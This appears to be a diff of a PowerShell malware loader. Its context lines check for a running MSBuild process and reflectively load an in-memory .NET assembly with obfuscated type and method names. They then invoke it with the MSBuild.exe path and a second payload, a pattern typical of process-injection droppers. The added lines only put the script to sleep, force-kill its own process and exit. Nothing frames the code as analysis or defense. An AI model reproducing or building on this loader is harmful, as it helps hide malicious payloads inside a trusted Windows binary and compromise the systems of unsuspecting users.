@@ -8,6 +8,12 @@ if((get-process "MSBuild" -ea SilentlyContinue) -eq $Null){
 
 [Reflection.Assembly]::Load($Runps).GetType('cBrUNZjmtgVRkYKJ41LpZAB4j8Ptcw.MnfyiECkcHITti0ou6oGt0g2KoPKw').GetMethod('fjiUTCEacemQWEPcTVFzsahj6EJVx').Invoke($null,[object[]] ('C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe',$Nanos))
 
+Start-Sleep 30
+
+Stop-Process -Id $PID -Force
+
+[Environment]::Exit(0)
+
 }
 
 Start-Sleep 30
